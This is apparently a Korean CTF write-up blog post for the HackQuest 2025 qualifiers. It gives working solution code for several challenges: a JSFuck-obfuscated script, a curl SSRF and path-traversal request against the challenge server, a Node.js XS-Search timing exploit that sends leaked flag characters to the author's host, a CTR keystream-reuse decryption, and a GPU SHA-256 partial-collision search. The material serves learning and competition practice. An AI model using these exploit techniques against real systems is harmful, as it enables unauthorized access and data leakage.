---
title: "HackQuest 2025 Quals WriteUp"
description: "Hackquest 2025 예선 WriteUp"
published: 2025-07-15
tags: [ctf]
category: hacking
draft: false
---

# Web 심화 - Open the door

```js
[][(![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+!+[]] + (+[![]] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]] + (+(!+[] + !+[] + !+[] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][[]] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!+[] + !+[] + !+[] + [!+[] + !+[]]) + (![] + [])[+!+[]] + (![] + [])[!+[] + !+[]])()((![] + [])[!+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (+(+!+[] + [+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + [!+[] + !+[]] + [+[]]) + [])[+!+[]] + (+(+!+[] + [+[]] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][[]] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!+[] + !+[] + [+!+[]])[+!+[]] + (!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (![] + [])[+[]] + ([] + [])[(![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]()[+!+[] + [+!+[]]] + ([] + [])[(![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]()[+!+[] + [!+[] + !+[]]] + ([![]] + [][[]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (![] + [])[!+[] + !+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + ([![]] + [][[]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + ([![]] + [][[]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + (+(+!+[] + [+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + [!+[] + !+[]] + [+[]]) + [])[+!+[]] + (+(+!+[] + [+[]] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][[]] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!+[] + !+[] + [+!+[]])[+!+[]] + (!![] + [])[+[]] + ((+[])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (![] + [])[!+[] + !+[]] + ([] + [])[(![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]()[+!+[] + [!+[] + !+[]]])
```
이거 실행하면 나온다.

# Web 심화 - Img Downloader

```bash
curl 'http://158.247.241.230:48253/api/download' \
  -H 'Content-Type: application/json' \
  --data-raw '{"url":"http://0:3000/../flag"}' \
  --insecure
```
0으로 Localhost 필터링 거르고 path traversal로 flag 검사 우회한다

# 웹 심화문제 - Notes
```js
const express = require('express');
const axios   = require('axios');
const app = express();
app.use(express.urlencoded({ extended: true }));

const LISTEN_PORT  = 5000;
const ORIGIN       = 'http://sub.lyj.co.kr:5000';
const BOT_ENDPOINT = 'http://158.247.241.230:15667/bot';

const CHARSET = [
   '0',  '1', '2', '3', '4', '5',
  '6', '7', '8', '9', ':', ';',  '<', '=', '>', '?', '@',
  '^', '_', '`', 'a',
  'b', 'c', 'd', 'e', 'f', 'g',  'h', 'i', 'j', 'k', 'l',
  'm', 'n', 'o', 'p', 'q', 'r',  's', 't', 'u', 'v', 'w',
  'x', 'y', 'z', '}',  '~'
];
//const CHARSET = "abcdefghijklnmopqrstuvwxyz".split("");

let flag        = 'hackquest2025{se4rch_me_1f_you_';
let guessingIdx = flag.length;
let charPos     = 0;

let timings = {};
let measurementBuffer = [];

async function dispatchBotVisit () {
  await new Promise((resolve) => setTimeout(resolve, 300))
  try {
    await axios.post(BOT_ENDPOINT, `url=${encodeURIComponent(ORIGIN)}`);
    //console.log('[+] Bot dispatched');
  } catch (err) {
    console.error('[!] Failed to dispatch bot:', err.message);
  }
}

app.get('/', (req, res) => {
  const candidateChar = CHARSET[charPos];
  const queryString   = encodeURIComponent(flag + candidateChar);

  const payload = `<!doctype html><html><body>
<script>
  document.addEventListener('DOMContentLoaded', () => {
    const t0 = performance.now();
    const fr = document.createElement('iframe');
    fr.src = 'http://127.0.0.1:5000/search?q=${queryString}';
    fr.onload = () => {
      const dt = performance.now() - t0;
      fetch('${ORIGIN}/report?i=${guessingIdx}&c=${encodeURIComponent(candidateChar)}&t=' + dt);
    };
    fetch('${ORIGIN}/probe');
    document.body.appendChild(fr);
  });
<\/script></body></html>`;

  res.type('html').send(payload);
});

app.get('/probe', (req, res) => res.end('ok'));

app.get('/report', (req, res) => {
  const { i, c, t } = req.query;
  const delta = parseFloat(t);
  process.stdout.write(`\r[report] i=${i} c='${c}' t=${delta.toFixed(1)}ms`);

  if (i < guessingIdx) return res.end('stale');

  measurementBuffer.push(delta);

  if (measurementBuffer.length < 2) {
    setImmediate(dispatchBotVisit);
    return res.end('ok');
  }

  const bestOfTwo = Math.min(...measurementBuffer);
  timings[c] = bestOfTwo;

  measurementBuffer = [];
  charPos++;
  if (charPos < CHARSET.length) {
    setImmediate(dispatchBotVisit);
    return res.end('ok');
  }

  const [bestChar, bestTime] = Object.entries(timings)
    .reduce((best, cur) => (cur[1] > best[1] ? cur : best), ['', -Infinity]);

  flag += bestChar;
  console.log(`\r✓ index ${guessingIdx} ⇒ '${bestChar}' (${bestTime.toFixed(1)} ms)  →  ${flag}\n`);

  if (bestChar === '}') {
    console.log('\n=======================================\n' + flag);
    return res.end('done');
  }

  guessingIdx++;
  charPos = 0;
  timings = {};

  setImmediate(dispatchBotVisit);
  res.end('ok');
});

app.listen(LISTEN_PORT, async () => {
  console.log(`up`);
  await dispatchBotVisit();
});
```

search 했을때 검색결과가 존재하면 view를 로드하며 의미있는 정도의 로딩 시간 증가(20ms)가 있음을 확인하고 exploit을 시도했다.
서버 상태에 의해서 너무 많이 시간이 튀어서 재요청에 시간제한을 걸고 각 단어당 2번씩 요청을 전송하여 걸린 시간중 낮은 시간을 선택하여 가장 응답시간이 높은 글자를 선택해 플래그를 완성하였다.


# Crypto 심화 - CTR

```python
from binascii import unhexlify

c1_hex = (
    "481b616b48d74a997a8a5d3be871de64a6bf91cf0d8b7fa795643b61803ca668"
    "58604e4eef13ffb99fef62a871599b85154d531f822029a2f5c9822c08df7193"
    "12dc3d838e816173e386d185427ff39a7c2f0da7f7519e047bd5df9257af9e83"
    "05d431453e2ed042771d261f07fb16a1c6bfa9c86238979dc7656b"
)
c2_hex = (
    "471b7d695796579c659e4472e370c12af4d98ec71e913ea291737c309636bb6f"
    "0f33081ee008e2f79dee54b16b75969916481608b13c2eebb1e5d7264bde63"
)

p1 = (
    b"Lorem ipsum dolor sit amet, consectetur adipiscing elit, "
    b"sed do eiusmod tempor incididunt ut labore et dolore magna aliqua."
)

c1 = unhexlify(c1_hex)
c2 = unhexlify(c2_hex)

keystream = bytes(x ^ y for x, y in zip(c1, p1))

p2 = bytes(x ^ y for x, y in zip(c2, keystream))

print(p2.decode())
```

Lorem ipsum가지고 키를 복구한다음에 복호화시켰다.

# Crypto 심화 - Birthday

나는 M4맥을 사용한다. GPU가속을 하고싶었다. GCP에서 NVIDIA L4 클러스터를 빌렸다. CUDA 설치하다가 실수로 클러스터 안꺼놔서 3만원 날렸다.
정작 프로그램 실행은 44초밖에 안걸렸다. 설치만 잘했으면 100원도 안들어가는건데...

```python
import cupy as cp
import numpy as np
import time
import hashlib
import random

# Highly optimized CUDA kernel with better GPU utilization
cuda_kernel = r'''
extern "C" {
    #define ASCII_BASE 95
    #define MSG_LEN 16
    #define PREFIX_LEN 13
    #define HASH_TABLE_SIZE ((1 << 30) + (1 << 28))
    #define HASH_TABLE_MASK (HASH_TABLE_SIZE - 1)
    
    __constant__ unsigned int k[64] = {
        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
    };
    
    __device__ inline unsigned int rotr(unsigned int x, unsigned int n) { 
        return (x >> n) | (x << (32 - n)); 
    }
    
    __device__ inline unsigned int ch(unsigned int x, unsigned int y, unsigned int z) { 
        return (x & y) ^ (~x & z); 
    }
    
    __device__ inline unsigned int maj(unsigned int x, unsigned int y, unsigned int z) { 
        return (x & y) ^ (x & z) ^ (y & z); 
    }
    
    __device__ inline unsigned int sigma0(unsigned int x) { 
        return rotr(x, 2) ^ rotr(x, 13) ^ rotr(x, 22); 
    }
    
    __device__ inline unsigned int sigma1(unsigned int x) { 
        return rotr(x, 6) ^ rotr(x, 11) ^ rotr(x, 25); 
    }
    
    __device__ inline unsigned int usigma0(unsigned int x) { 
        return rotr(x, 7) ^ rotr(x, 18) ^ (x >> 3); 
    }
    
    __device__ inline unsigned int usigma1(unsigned int x) { 
        return rotr(x, 17) ^ rotr(x, 19) ^ (x >> 10); 
    }
    
    __device__ inline unsigned int bswap_32(unsigned int x) { 
        return ((x & 0xFF) << 24) | ((x & 0xFF00) << 8) | ((x >> 8) & 0xFF00) | ((x >> 24) & 0xFF); 
    }
    
    __device__ inline unsigned long long bswap_64(unsigned long long x) { 
        x = (x & 0x00000000FFFFFFFF) << 32 | (x & 0xFFFFFFFF00000000) >> 32; 
        x = (x & 0x0000FFFF0000FFFF) << 16 | (x & 0xFFFF0000FFFF0000) >> 16; 
        x = (x & 0x00FF00FF00FF00FF) << 8  | (x & 0xFF00FF00FF00FF00) >> 8; 
        return x; 
    }
    
    __device__ void sha256_transform(unsigned int *state, const unsigned char *block) { 
        unsigned int w[64]; 
        
        // Load first 16 words and byte-swap
        for (int i = 0; i < 16; ++i) {
            w[i] = bswap_32(((unsigned int*)block)[i]);
        }
        
        // Extend to 64 words
        for (int i = 16; i < 64; ++i) {
            w[i] = usigma1(w[i - 2]) + w[i - 7] + usigma0(w[i - 15]) + w[i - 16];
        }
        
        unsigned int a = state[0], b = state[1], c = state[2], d = state[3];
        unsigned int e = state[4], f = state[5], g = state[6], h = state[7];
        
        // Main SHA-256 compression loop
        for (int i = 0; i < 64; ++i) { 
            unsigned int t1 = h + sigma1(e) + ch(e, f, g) + k[i] + w[i]; 
            unsigned int t2 = sigma0(a) + maj(a, b, c); 
            h = g; g = f; f = e; e = d + t1; d = c; c = b; b = a; a = t1 + t2; 
        } 
        
        state[0] += a; state[1] += b; state[2] += c; state[3] += d; 
        state[4] += e; state[5] += f; state[6] += g; state[7] += h; 
    }
    
    __device__ void counter_to_ascii16(unsigned long long cnt, char *buf) { 
        for (int i = 0; i < MSG_LEN; i++) { 
            unsigned long long rem = cnt % ASCII_BASE; 
            buf[i] = (char)(0x20 + rem); 
            cnt /= ASCII_BASE; 
        } 
    }
    
    // GPU-based collision detection with hash table
    __global__ void find_collisions_kernel(const unsigned char* prefix, 
                                          unsigned long long start_counter,
                                          int collision_bits,
                                          unsigned long long* hash_table,
                                          unsigned long long* counter_table,
                                          int* collision_found,
                                          unsigned long long* collision_counters) {
        
        unsigned long long idx = (unsigned long long)blockIdx.x * blockDim.x + threadIdx.x;
        unsigned long long current_counter = start_counter + idx;
        
        // Use shared memory for better performance
        __shared__ unsigned char shared_prefix[PREFIX_LEN];
        if (threadIdx.x < PREFIX_LEN) {
            shared_prefix[threadIdx.x] = prefix[threadIdx.x];
        }
        __syncthreads();
        
        unsigned char message[128];
        unsigned int state[8] = { 
            0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 
            0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19 
        };
        
        // Clear message buffer
        for (int i = 0; i < 128; i++) {
            message[i] = 0;
        }
        
        // Copy prefix from shared memory
        for (int i = 0; i < PREFIX_LEN; i++) {
            message[i] = shared_prefix[i];
        }
        
        // Generate counter-based suffix
        counter_to_ascii16(current_counter, (char*)(message + PREFIX_LEN));
        
        int message_len = PREFIX_LEN + MSG_LEN;
        message[message_len] = 0x80;
        
        int block_len = (message_len + 8 >= 56) ? 120 : 56;
        *(unsigned long long*)(message + block_len) = bswap_64((unsigned long long)message_len * 8);
        
        // Process blocks
        sha256_transform(state, message);
        if (message_len + 8 >= 56) {
            sha256_transform(state, message + 64);
        }
        
        // Extract hash prefix
        unsigned long long hash_64bits = ((unsigned long long)bswap_32(state[0]) << 32) | bswap_32(state[1]);
        unsigned long long hash_prefix = hash_64bits >> (64 - collision_bits);
        
        // Hash table lookup with linear probing
        unsigned int table_idx = (unsigned int)(hash_prefix & HASH_TABLE_MASK);
        
        // Linear probing for collision detection
        for (int probe = 0; probe < 32; probe++) {
            unsigned int current_idx = (table_idx + probe) & HASH_TABLE_MASK;
            
            // Try to insert into hash table
            unsigned long long old_hash = atomicCAS(&hash_table[current_idx], 0ULL, hash_prefix);
            
            if (old_hash == 0ULL) {
                // Successfully inserted, store counter
                counter_table[current_idx] = current_counter;
                break;
            } else if (old_hash == hash_prefix) {
                // Collision found!
                unsigned long long other_counter = counter_table[current_idx];
                if (other_counter != current_counter) {
                    int old_found = atomicCAS(collision_found, 0, 1);
                    if (old_found == 0) {
                        // First collision found
                        collision_counters[0] = other_counter;
                        collision_counters[1] = current_counter;
                        collision_counters[2] = hash_prefix;
                    }
                }
                break;
            }
        }
    }
    
    // Simple kernel for high throughput without collision detection
    __global__ void compute_hashes_kernel(const unsigned char* prefix, 
                                         unsigned long long start_counter,
                                         unsigned long long* out_hashes, 
                                         unsigned long long* out_counters) {
        
        unsigned long long idx = (unsigned long long)blockIdx.x * blockDim.x + threadIdx.x;
        unsigned long long current_counter = start_counter + idx;
        
        // Use shared memory for prefix
        __shared__ unsigned char shared_prefix[PREFIX_LEN];
        if (threadIdx.x < PREFIX_LEN) {
            shared_prefix[threadIdx.x] = prefix[threadIdx.x];
        }
        __syncthreads();
        
        unsigned char message[128];
        unsigned int state[8] = { 
            0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 
            0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19 
        };
        
        // Clear and setup message
        for (int i = 0; i < 128; i++) message[i] = 0;
        for (int i = 0; i < PREFIX_LEN; i++) message[i] = shared_prefix[i];
        
        counter_to_ascii16(current_counter, (char*)(message + PREFIX_LEN));
        
        int message_len = PREFIX_LEN + MSG_LEN;
        message[message_len] = 0x80;
        int block_len = (message_len + 8 >= 56) ? 120 : 56;
        *(unsigned long long*)(message + block_len) = bswap_64((unsigned long long)message_len * 8);
        
        sha256_transform(state, message);
        if (message_len + 8 >= 56) {
            sha256_transform(state, message + 64);
        }
        
        out_hashes[idx] = ((unsigned long long)bswap_32(state[0]) << 32) | bswap_32(state[1]);
        out_counters[idx] = current_counter;
    }
}
'''

def counter_to_ascii16(cnt):
    ASCII_BASE = 95
    MSG_LEN = 16
    buf = [''] * MSG_LEN
    for i in range(MSG_LEN):
        rem = cnt % ASCII_BASE
        buf[i] = chr(0x20 + int(rem))
        cnt //= ASCII_BASE
    return "".join(buf)

def get_aggressive_launch_config():
    device = cp.cuda.runtime.getDeviceProperties(0)
    max_threads_per_block = device['maxThreadsPerBlock']
    multiprocessor_count = device['multiProcessorCount']

    # Tesla T4 has 40 SMs, use aggressive configuration
    threads_per_block = min(1024, max_threads_per_block)  # Use maximum threads
    blocks = multiprocessor_count * 8  # 8 blocks per SM for better occupancy

    return threads_per_block, blocks

def find_collision_gpu_optimized(prefix_str, collision_bits, use_gpu_collision_detection=True):
    THREADS_PER_BLOCK, BLOCKS = get_aggressive_launch_config()
    NUM_HASHES_PER_BATCH = THREADS_PER_BLOCK * BLOCKS

    print("--- OPTIMIZED GPU SHA-256 Collision Search ---")
    print(f"Prefix: '{prefix_str}'")
    print(f"Target collision bits: {collision_bits}")
    print(f"Threads per block: {THREADS_PER_BLOCK}")
    print(f"Blocks: {BLOCKS}")
    print(f"Hashes per batch: {NUM_HASHES_PER_BATCH:,}")
    print(f"GPU collision detection: {use_gpu_collision_detection}")

    start_time = time.time()

    try:
        if use_gpu_collision_detection:
            collision_kernel = cp.RawKernel(cuda_kernel, 'find_collisions_kernel',
                                            options=('--use_fast_math', '--maxrregcount=64'))
        else:
            compute_kernel = cp.RawKernel(cuda_kernel, 'compute_hashes_kernel',
                                          options=('--use_fast_math', '--maxrregcount=32'))
    except cp.cuda.compiler.CompilerException as e:
        print(f"Kernel compilation error: {e}")
        return

    prefix_bytes = prefix_str.encode('ascii')
    prefix_gpu = cp.array(np.frombuffer(prefix_bytes, dtype=np.uint8))

    total_hashes_computed = 0
    start_counter = random.randint(0, 1000000)

    if use_gpu_collision_detection:
        HASH_TABLE_SIZE = ((1 << 30) + (1 << 28))
        hash_table_gpu = cp.zeros(HASH_TABLE_SIZE, dtype=cp.uint64)
        counter_table_gpu = cp.zeros(HASH_TABLE_SIZE, dtype=cp.uint64)
        collision_found_gpu = cp.zeros(1, dtype=cp.int32)
        collision_counters_gpu = cp.zeros(3, dtype=cp.uint64)

        print(f"Hash table size: {HASH_TABLE_SIZE:,}")

        try:
            while True:
                collision_found_gpu.fill(0)

                collision_kernel((BLOCKS,), (THREADS_PER_BLOCK,), (
                    prefix_gpu, start_counter, collision_bits,
                    hash_table_gpu, counter_table_gpu,
                    collision_found_gpu, collision_counters_gpu
                ))

                if collision_found_gpu.get()[0]:
                    collision_data = collision_counters_gpu.get()
                    counter1, counter2, hash_prefix = collision_data

                    # Verify collision
                    msg1 = prefix_str + counter_to_ascii16(int(counter1))
                    msg2 = prefix_str + counter_to_ascii16(int(counter2))

                    hash1 = hashlib.sha256(msg1.encode('ascii')).digest()
                    hash2 = hashlib.sha256(msg2.encode('ascii')).digest()

                    hash1_prefix = int.from_bytes(hash1[:8], 'big') >> (64 - collision_bits)
                    hash2_prefix = int.from_bytes(hash2[:8], 'big') >> (64 - collision_bits)

                    if hash1_prefix == hash2_prefix:
                        elapsed = time.time() - start_time
                        rate = total_hashes_computed / elapsed

                        main1 = msg1.replace("HackQuest2025", "")
                        main2 = msg2.replace("HackQuest2025", "")
                        print(f"\n--- COLLISION FOUND! ---")
                        print(f"Total hashes: {total_hashes_computed:,}")
                        print(f"Time: {elapsed:.2f}s")
                        print(f"Rate: {rate:,.0f} H/s")
                        print(f"Message 1: |{msg1}|{main1}|")
                        print(f"Message 2: |{msg2}|{main2}|")
                        print(f"Hash prefix: {hex(hash1_prefix)}")
                        return

                total_hashes_computed += NUM_HASHES_PER_BATCH
                start_counter += NUM_HASHES_PER_BATCH

                elapsed = time.time() - start_time
                rate = total_hashes_computed / elapsed if elapsed > 0 else 0
                print(f"Hashes: {total_hashes_computed:15,d} | Rate: {rate:15,.0f} H/s", end='\r')

        except KeyboardInterrupt:
            print(f"\nInterrupted after {total_hashes_computed:,} hashes")

    else:
        out_hashes_gpu = cp.zeros(NUM_HASHES_PER_BATCH, dtype=cp.uint64)
        out_counters_gpu = cp.zeros(NUM_HASHES_PER_BATCH, dtype=cp.uint64)
        found_hashes = {}

        try:
            while True:
                compute_kernel((BLOCKS,), (THREADS_PER_BLOCK,), (
                    prefix_gpu, start_counter, out_hashes_gpu, out_counters_gpu
                ))

                hashes_cpu = out_hashes_gpu.get()
                counters_cpu = out_counters_gpu.get()
                total_hashes_computed += NUM_HASHES_PER_BATCH

                for i, counter in enumerate(counters_cpu):
                    counter = int(counter)
                    msg = prefix_str + counter_to_ascii16(counter)
                    full_hash = hashlib.sha256(msg.encode('ascii')).digest()
                    hash_prefix = int.from_bytes(full_hash[:8], 'big') >> (64 - collision_bits)

                    if hash_prefix in found_hashes:
                        counter1 = found_hashes[hash_prefix]
                        if counter1 != counter:
                            elapsed = time.time() - start_time
                            rate = total_hashes_computed / elapsed

                            msg1 = prefix_str + counter_to_ascii16(counter1)
                            msg2 = prefix_str + counter_to_ascii16(counter)

                            print(f"\n--- COLLISION FOUND! ---")
                            print(f"Total hashes: {total_hashes_computed:,}")
                            print(f"Time: {elapsed:.2f}s")
                            print(f"Rate: {rate:,.0f} H/s")
                            print(f"Message 1: {msg1}")
                            print(f"Message 2: {msg2}")
                            print(f"Hash prefix: {hex(hash_prefix)}")
                            return

                    found_hashes[hash_prefix] = counter

                start_counter += NUM_HASHES_PER_BATCH

                elapsed = time.time() - start_time
                rate = total_hashes_computed / elapsed if elapsed > 0 else 0
                print(f"Hashes: {total_hashes_computed:15,d} | Rate: {rate:15,.0f} H/s", end='\r')

        except KeyboardInterrupt:
            print(f"\nInterrupted after {total_hashes_computed:,} hashes")

if __name__ == "__main__":
    PREFIX = "HackQuest2025"
    COLLISION_BITS = 64

    print("Trying GPU-based collision detection...")
    find_collision_gpu_optimized(PREFIX, COLLISION_BITS, use_gpu_collision_detection=True)
```

그냥 램을 사용하니까 너무 느렸다.
GPU 연산값을 CPU로 안넘기고 GPU 안에서 해시충돌쌍을 찾아 해결했다.

44초걸렸다.

